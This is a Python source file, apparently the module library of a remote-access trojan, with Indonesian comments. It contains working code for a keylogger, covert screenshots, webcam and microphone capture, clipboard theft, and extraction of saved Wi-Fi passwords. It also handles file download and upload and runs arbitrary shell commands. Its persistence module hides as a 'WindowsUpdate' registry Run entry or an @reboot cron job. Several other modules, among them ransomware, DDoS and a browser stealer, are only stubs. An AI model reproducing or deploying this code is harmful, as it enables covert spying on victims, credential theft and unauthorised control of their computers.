import platform
import subprocess
import os
import socket
import time
import json
from datetime import datetime

# Base module
class Module:
    name = "BaseModule"
    def __init__(self, client=None):
        self.client = client

    def run(self, *args, **kwargs):
        raise NotImplementedError

# ========== SYSTEM INFO ==========
class SystemInfoModule(Module):
    name = "SystemInfo"
    def run(self):
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.release(),
            "arch": platform.machine(),
            "user": os.getlogin(),
            "local_ip": socket.gethostbyname(platform.node()),
            "timestamp": datetime.now().isoformat()
        }
        try:
            import requests
            info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            info["public_ip"] = "Unknown"
        return info

# ========== SCREENSHOT ==========
class ScreenshotModule(Module):
    name = "Screenshot"
    def run(self):
        try:
            import mss
            with mss.mss() as sct:
                sct.shot(output="screen_temp.png")
            with open("screen_temp.png", "rb") as f:
                data = f.read()
            os.remove("screen_temp.png")
            return data
        except Exception as e:
            return f"ERROR: {e}".encode()

# ========== KEYLOGGER ==========
class KeyloggerModule(Module):
    name = "Keylogger"
    def __init__(self, client=None):
        super().__init__(client)
        self.log = ""
        self.listener = None
        self.running = False

    def _on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f"[{key}]"

    def start(self):
        try:
            from pynput import keyboard
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.running = True
            return "Keylogger started"
        except ImportError:
            return "pynput not installed"

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.running = False
            return "Keylogger stopped"
        return "Not running"

    def dump(self):
        logs = self.log
        self.log = ""
        return logs

    def run(self, action, *args):
        if action == "start":
            return self.start()
        elif action == "stop":
            return self.stop()
        elif action == "dump":
            return self.dump()
        else:
            return f"Unknown keylogger action: {action}"

# ========== WEBCAM ==========
class WebcamModule(Module):
    name = "Webcam"
    def run(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                cv2.imwrite("webcam_temp.jpg", frame)
                with open("webcam_temp.jpg", "rb") as f:
                    data = f.read()
                os.remove("webcam_temp.jpg")
                return data
            else:
                return b"WEBCAM_FAILED"
        except ImportError:
            return b"OPENCV_NOT_INSTALLED"

# ========== PERSISTENCE ==========
class PersistenceModule(Module):
    name = "Persistence"
    def run(self):
        system = platform.system()
        try:
            if system == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
                return "Persistence installed (registry)"
            elif system == "Linux":
                cron = f"@reboot {sys.executable} {os.path.abspath(__file__)} >/dev/null 2>&1\n"
                with open("/tmp/cron_tmp", "w") as f:
                    subprocess.run(["crontab", "-l"], stdout=f, stderr=subprocess.DEVNULL)
                with open("/tmp/cron_tmp", "a") as f:
                    f.write(cron)
                subprocess.run(["crontab", "/tmp/cron_tmp"])
                os.remove("/tmp/cron_tmp")
                return "Persistence installed (crontab)"
            else:
                return "Unsupported OS"
        except Exception as e:
            return f"Persistence failed: {e}"

# ========== FILE MANAGER ==========
class FileManagerModule(Module):
    name = "FileManager"
    def run(self, action, *args):
        if action == "download":
            filename = args[0]
            try:
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        return f.read()
                else:
                    return b"FILE_NOT_FOUND"
            except Exception as e:
                return f"ERROR: {e}".encode()
        elif action == "upload":
            filename, data = args[0], args[1]
            try:
                with open(filename, 'wb') as f:
                    f.write(data)
                return f"Uploaded {filename}"
            except Exception as e:
                return f"Upload failed: {e}"
        elif action == "list":
            path = args[0] if args else "."
            try:
                files = os.listdir(path)
                return "\n".join(files)
            except Exception as e:
                return f"Error: {e}"
        else:
            return "Unknown file action"

# ========== REVERSE SHELL ==========
class ReverseShellModule(Module):
    name = "ReverseShell"
    def run(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"

# ========== PROCESS MANAGER ==========
class ProcessManagerModule(Module):
    name = "ProcessManager"
    def run(self, action, *args):
        try:
            import psutil
            if action == "list":
                procs = []
                for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                    procs.append(f"{p.info['pid']}\t{p.info['name']}\t{p.info['cpu_percent']}%\t{p.info['memory_percent']}%")
                return "\n".join(procs[:50])  # batasi 50
            elif action == "kill":
                pid = int(args[0])
                p = psutil.Process(pid)
                p.terminate()
                return f"Process {pid} terminated"
            else:
                return "Unknown action"
        except ImportError:
            return "psutil not installed"
        except Exception as e:
            return f"Error: {e}"

# ========== CLIPBOARD GRABBER ==========
class ClipboardGrabberModule(Module):
    name = "ClipboardGrabber"
    def run(self):
        try:
            import pyperclip
            return pyperclip.paste()
        except ImportError:
            return "pyperclip not installed"

# ========== AUDIO RECORDER ==========
class AudioRecorderModule(Module):
    name = "AudioRecorder"
    def run(self, duration=5):
        try:
            import sounddevice as sd
            import numpy as np
            from scipy.io.wavfile import write
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            write("audio_temp.wav", fs, recording)
            with open("audio_temp.wav", "rb") as f:
                data = f.read()
            os.remove("audio_temp.wav")
            return data
        except ImportError:
            return b"AUDIO_MODULE_MISSING"

# ========== BROWSER STEALER ==========
class BrowserStealerModule(Module):
    name = "BrowserStealer"
    def run(self):
        # Placeholder – implementasi nyata akan panjang
        return "BrowserStealer not fully implemented"

# ========== WIFI GRABBER ==========
class WiFiGrabberModule(Module):
    name = "WiFiGrabber"
    def run(self):
        system = platform.system()
        if system == "Windows":
            try:
                data = subprocess.run("netsh wlan show profiles", capture_output=True, text=True, shell=True)
                profiles = []
                for line in data.stdout.split('\n'):
                    if "All User Profile" in line:
                        ssid = line.split(':')[1].strip()
                        prof_data = subprocess.run(f'netsh wlan show profile "{ssid}" key=clear', capture_output=True, text=True, shell=True)
                        for l in prof_data.stdout.split('\n'):
                            if "Key Content" in l:
                                password = l.split(':')[1].strip()
                                profiles.append(f"{ssid}:{password}")
                return "\n".join(profiles) if profiles else "No WiFi profiles found"
            except:
                return "Failed to get WiFi passwords"
        else:
            return "Only Windows supported for now"

# ========== TOKEN GRABBER ==========
class TokenGrabberModule(Module):
    name = "TokenGrabber"
    def run(self):
        # Placeholder sederhana
        return "Token grabber not implemented"

# ========== PACKET SNIFFER ==========
class PacketSnifferModule(Module):
    name = "PacketSniffer"
    def run(self):
        return "Packet sniffer not implemented"

# ========== DDOS ==========
class DDoSModule(Module):
    name = "DDoS"
    def run(self, target_ip, target_port, duration=10):
        return "DDoS module disabled for safety"

# ========== RANSOMWARE ==========
class RansomwareModule(Module):
    name = "Ransomware"
    def run(self):
        return "Ransomware module disabled"

# ========== FACTORY ==========
class ModuleFactory:
    @staticmethod
    def get_module(name, client=None):
        modules = {
            "SystemInfo": SystemInfoModule,
            "Screenshot": ScreenshotModule,
            "Keylogger": KeyloggerModule,
            "Webcam": WebcamModule,
            "Persistence": PersistenceModule,
            "FileManager": FileManagerModule,
            "ReverseShell": ReverseShellModule,
            "ProcessManager": ProcessManagerModule,
            "ClipboardGrabber": ClipboardGrabberModule,
            "AudioRecorder": AudioRecorderModule,
            "BrowserStealer": BrowserStealerModule,
            "WiFiGrabber": WiFiGrabberModule,
            "TokenGrabber": TokenGrabberModule,
            "PacketSniffer": PacketSnifferModule,
            "DDoS": DDoSModule,
            "Ransomware": RansomwareModule
        }
        cls = modules.get(name)
        if cls:
            return cls(client)
        return None
